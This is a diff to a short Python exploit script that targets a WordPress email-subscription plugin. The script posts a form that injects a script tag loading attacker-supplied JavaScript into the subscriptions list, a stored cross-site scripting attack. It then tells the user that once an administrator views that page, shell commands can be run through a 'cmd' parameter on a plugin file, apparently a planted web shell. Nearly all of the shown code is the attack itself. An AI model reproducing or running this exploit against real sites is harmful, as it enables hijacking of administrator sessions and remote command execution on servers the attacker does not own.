@@ -6,10 +6,13 @@ import urllib
 
 def make_request():
     data = "name_mail=" + args.name + "&email_mail=" + urllib.quote(args.emailaddr) + "&reference_mail=<script src=" + args.exploiturl + "></script>futbol live scores!&emailing-send=Subscribe"
-    print data
+
     # request needs a content-type header in order to properly submit the form
     headers = { 'Content-Type': 'application/x-www-form-urlencoded' }
     r = requests.post(args.url, data=data, headers=headers)
+
+    print "After an admin browses to the mailing list subscriptions page,"
+    print "Execute your commands at: " + args.url + "/wp-content/plugins/email-suscripcion/emailing-lista.php?cmd="
 
 
 if __name__ == '__main__':
